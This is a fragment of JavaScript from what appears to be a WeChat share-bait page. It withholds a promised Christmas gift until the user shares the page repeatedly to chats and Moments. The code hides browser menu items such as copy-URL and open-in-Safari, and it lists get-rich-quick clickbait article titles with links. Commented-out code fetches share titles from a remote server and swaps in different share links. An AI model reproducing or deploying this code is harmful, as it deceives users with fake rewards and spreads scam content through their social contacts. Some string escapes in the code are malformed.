                weui["alert"]('\u5206\u4EAB\u6210\u529F\uFF0C\u5269\u4E0B\u6700\u540E\u4E00\u6B65\u5566\21</br>\u8BF7\u5206\u4EAB\u5230<span style="font-size: 30px;color: #f5294c">\u670B\u53CB\u5708</span>\u5373\u53EF\u9886\u53D6\uFF01');
                break;
            case 4:
                weui["alert"](message, '', gotocj);
                break;
        }
    }

//share hack sdk
    var timess = 0;
    var share_pyq_flag = false;

    // var fetch_share_title_url = 'http://m.homeslife.cn/fission/cgi/get_url.php?sk=gift_share_title';
    // $.getJSON(fetch_share_title_url, function (d) {
    //     if (d && d.url) {
    //         var cnt = d.url;
    //         try {
    //             var segs = cnt.split('?')[0].split('.');
    //             segs = segs.slice(1).join('.').split('|');
    //             s_qun_title = decodeURIComponent(segs[0] || '');
    //             s_qun_content = decodeURIComponent(segs[1] || '');
    //             s_qun_imgurl = decodeURIComponent(segs[2] || '');
    //             if (!window.should_not_set_timeline_title) {
    //                 s_timeline_title = decodeURIComponent(segs[3] || '');
    //             }
    //             s_timeline_content = decodeURIComponent(segs[4] || '');
    //             s_timeline_imgurl = decodeURIComponent(segs[5] || '');
    //         } catch (e) {
    //         }
    //     }
    // });

    // $.getJSON('http://m.homeslife.cn/fission/cgi/get_url.php?sk=watch_back', function (d) {
    //     if (d && d.url && url_reg.test(d.url)) {
    //         pan_url = d.url;
    //     }
    // });

    var pan_list = [
        {
            title: '还在炒股和买彩票吗？他用微信已轻松月入数万，太过瘾！',
            link: 'http://mp.weixin.qq.com/s?__biz=MzI2MTUwMjM4MQ==&mid=2247483651&idx=1&sn=46ad91d213ac2ca4fe989e664a4b6299#rd'
        },
        {
            title: '先定一个小目标一晚上赚一万块，我竟然真的实现了！',
            link: 'http://mp.weixin.qq.com/s?__biz=MzI2MTUwMjM4MQ==&mid=2247483651&idx=2&sn=4523b32ff131f26b69dd8f7dc9701b6d#rd'
        },
        {
            title: '微信还能赚钱，免费送100元交易卷给你玩，还可以提现哦！',
            link: 'http://mp.weixin.qq.com/s?__biz=MzI2MTUwMjM4MQ==&mid=2247483651&idx=3&sn=7ff8a06865504865b5d7a428bd6dd9cf#rd'
        },
        {
            title: '闺蜜月收入3500，也买上了豪车的秘决，令我太震惊......',
            link: 'http://mp.weixin.qq.com/s?__biz=MzI2MTUwMjM4MQ==&mid=2247483651&idx=4&sn=c1eb7a857081f3b2c514107d782d4d7e#rd'
        },
        {
            title: '㊙穷小子变身高富帅，如果你还愁怎么赚钱，看了这个你就知道！',
            link: 'http://mp.weixin.qq.com/s?__biz=MzI2MTUwMjM4MQ==&mid=2247483651&idx=5&sn=4f247537f1e942810e29f924907ce55f#rd'
        },
        {
            title: '㊙怎样才能成为像周润发这么成功的人，重点你还得看下这个......',
            link: 'http://mp.weixin.qq.com/s?__biz=MzI2MTUwMjM4MQ==&mid=2247483651&idx=6&sn=9c9f64029bfe8a82f2f09005e24f72a0#rd'
        },
        {
            title: '㊙如果你想在30岁前赚到100万，看了这个包你梦想成真！',
            link: 'http://mp.weixin.qq.com/s?__biz=MzI2MTUwMjM4MQ==&mid=2247483651&idx=7&sn=493fcfd07516a238dd4315eaff56792c#rd'
        }
    ];
    var rnd = Math.random();

    function getShareData(timeline) {
        // var processed_share_url = share_url;
        // if (rnd < 0) {
        //     var tle_obj = pan_list[Math.floor(Math.random() * pan_list.length)];
        //     processed_share_url = tle_obj.link;
        //     s_timeline_title = tle_obj.title;
        //     window.should_not_set_timeline_title = true;
        // }
        if (window.ourself_domain) {
            if (timeline || window.shareType == 'shareTimeline') {
                return {
                    title: s_timeline_title || "\u5723\u8BDE\u8282\u5C0F\u793C\u54C1\2C\u7ACB\u5373\u62A2\uFF01",
                    desc: s_timeline_content || '\u7ACB\u62A2\u9886\u53D6',
                    link: processed_share_url,
                    img_url: s_timeline_imgurl
                };
            } else {
                return {
                    title: s_qun_title || "\u5723\u8BDE\u8282\u5C0F\u793C\u54C1\2C\u7ACB\u5373\u62A2\uFF01",
                    desc: s_qun_content || '\u7ACB\u62A2\u9886\u53D6',
                    link: share_url,
                    img_url: s_qun_imgurl
                }
            }
        } else {
            if (timeline) {
                return {
                    title: function () {
                        return s_timeline_title || "\u5723\u8BDE\u8282\u5C0F\u793C\u54C1\2C\u7ACB\u5373\u62A2\uFF01"
                    },
                    desc: function () {
                        return s_timeline_content || '\u7ACB\u62A2\u9886\u53D6'
                    },
                    link: function () {
                        return processed_share_url;
                    },
                    img_url: function () {
                        return s_timeline_imgurl
                    }
                };
            } else {
                return {
                    title: function () {
                        return s_qun_title || "\u5723\u8BDE\u8282\u5C0F\u793C\u54C1\2C\u7ACB\u5373\u62A2\uFF01"
                    },
                    desc: function () {
                        return s_qun_content || '\u7ACB\u62A2\u9886\u53D6'
                    },
                    link: function () {
                        return share_url
                    },
                    img_url: function () {
                        return s_qun_imgurl
                    }
                }
            }
        }
    }

    function shareComplete(flag) {
        if (flag == 1) {
            share_pyq_flag = true;
            if (timess >= 2) {
                $("#sa000").hide();
                $("#nr2804").html($("#nr2804_v").html());
                // sharetips(4);
            } else {
                sharetips(timess);
            }
        } else {
            timess++;
            if (timess >= 3) {
                timess = 3;
            }
            // if (timess == 3 && share_pyq_flag) {
            if (timess == 3) {
                $("#sa000").hide();
                $("#nr2804").html($("#nr2804_v").html());
                // sharetips(4);
            } else {
                sharetips(timess);
            }
        }
    }

    window.shareobject = window.shareobject || {};
    window.shareobject.getshareData = getShareData;
    window.shareobject.shareComplete = shareComplete;
    function do_sh() {
        try {
            wx.ready(function () {
                var share_app_data = window.shareobject.getshareData();
                var share_timeline_data = window.shareobject.getshareData(true);

                wx.showOptionMenu();
                wx.hideMenuItems({
                    menuList: [
                        'menuItem:share:weiboApp',
                        'menuItem:share:qq',
                        'menuItem:favorite',
                        'menuItem:share:facebook',
                        'menuItem:share:QZone',
                        'menuItem:editTag',
                        'menuItem:copyUrl',
                        'menuItem:originPage',
                        'menuItem:readMode',
                        'menuItem:openWithQQBrowser',
                        'menuItem:openWithSafari',
                        'menuItem:share:email',
                        'menuItem:share:brand'
                    ]
                });

                wx.onMenuShareTimeline({
                    title: share_timeline_data.title(),
                    link: share_timeline_data.link(),
                    desc: share_timeline_data.desc(),
                    imgUrl: share_timeline_data.img_url(),
                    success: function () {
                        shareComplete(1);
                    },
                    cancel: function () {
                    }
                });
                wx.onMenuShareAppMessage({
                    title: share_app_data.title(),
                    desc: share_app_data.desc(),
                    link: share_app_data.link(),
                    imgUrl: share_app_data.img_url(),
                    type: '',
                    dataUrl: '',
                    success: function () {
                        shareComplete(1);
                    },
                    cancel: function () {
                    }
                });

            });
        }
        catch (ex) {
            alert(ex)
        }
    }

    if (!window.ourself_domain && window.wx) {
        setTimeout('do_sh()', 1000);
        setTimeout('do_sh()', 2000)
        setTimeout('do_sh()', 3000)
    }

    window._czc = window._czc || [];
    function loadJS(src, callback, errCallback) {
        if (!src) {
            return;
        }
        var e = document.createElement('script');
        e.setAttribute('type', 'text/javascript');
        e.setAttribute('charset', "utf-8");
        e.setAttribute('src', src);
        document.getElementsByTagName('head')[0].appendChild(e);
        if (typeof errCallback == 'function') {
            e.onerror = errCallback;
        }
        e.onload = function () {
            if (typeof callback == 'function') {
                callback();
            }
        };
    }

    /*function tj(id, web_id) {
        loadJS('https://s4.cnzz.com/z_stat.php?id=' + id + '&web_id=' + web_id);
        _czc.push(["_setAccount", web_id]);
    }

    window.g_initTj = tj;
    var domain_host = location.host;
    var self_reg = /\.co$/;
    if (self_reg.test(domain_host)) {
        g_initTj(1261028838, 1261028838);
    } else {
        g_initTj(1261025193, 1261025193);
    }
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?dc7a9b2f094020ce14812beb89631ace";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();*/
}



document.getElementById("sm168").onclick = function (){
    document.getElementById("sa000").style.display = "block";
}
}
